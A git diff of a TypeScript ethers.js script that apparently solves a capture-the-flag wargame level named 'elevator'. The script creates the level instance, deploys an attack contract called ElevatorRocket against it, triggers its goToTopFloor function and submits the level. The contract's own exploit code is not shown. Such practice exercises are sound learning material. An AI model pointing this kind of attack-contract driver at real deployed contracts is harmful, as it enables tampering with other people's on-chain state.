@@ -3,16 +3,18 @@ import { BigNumber, ethers, Signer } from "ethers";
 import { Interface } from "ethers/lib/utils";
 import { getSigner } from "./signer";
 import { ElevatorRocket__factory } from "../typechain";
+import { createLevel, submitLevel } from "./utils";
 
 
 async function main() {
-  const instanceAddress = "0x293c413790FA3853e43cba782B052Abc9c9c4a09";
   const signer = getSigner();
+  const level = await createLevel(signer, "elevator");
   console.log("deploy attack contract");
-  const ct = await (new ElevatorRocket__factory(signer)).deploy(instanceAddress);
+  const ct = await (new ElevatorRocket__factory(signer)).deploy(level);
   await ct.deployed();
   console.log("address deployed:", ct.address);
-  await ct.GoToTopFloor();
+  await ct.goToTopFloor();
+  await submitLevel(signer,level)
 }
 
 main()
